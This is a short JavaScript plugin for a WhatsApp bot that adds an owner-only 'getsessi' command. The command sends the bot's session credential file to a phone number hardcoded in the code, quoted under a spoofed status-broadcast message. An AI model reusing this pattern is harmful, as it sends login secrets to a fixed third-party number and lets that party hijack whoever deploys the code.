import fs from 'fs'
import fetch from 'node-fetch'
let handler = async (m, { conn, usedPrefix: _p, args, command }) => {
	let fdoc = {
  key : {
  remoteJid: 'status@broadcast',
  participant : '0@s.whatsapp.net'
  },
  message: {
  documentMessage: {
  title: 'Session', 
  jpegThumbnail: fs.readFileSync('./thumbnail.jpg'),
                            }
                          }
                        }
	let d = new Date
            let date = d.toLocaleDateString('id', {
                day: 'numeric',
                month: 'long',
                year: 'numeric'
            })
conn.reply(m.chat, `*Sukses!* sessions telah dikirim ke kontak Owner`,m)
conn.reply('6283837709331' + '@s.whatsapp.net', `*session.data.json tanggal ${date}*`, m)
          conn.sendFile('6283837709331' + '@s.whatsapp.net', fs.readFileSync('./session.data.json'), 'session.data.json', '', 0, 0, { mimetype: 'application/js', quoted: fdoc})
 }
 
handler.help = ['getsessi']
handler.tags = ['developer']
handler.command = /^(getsessi)$/i

handler.rowner = true

export default handler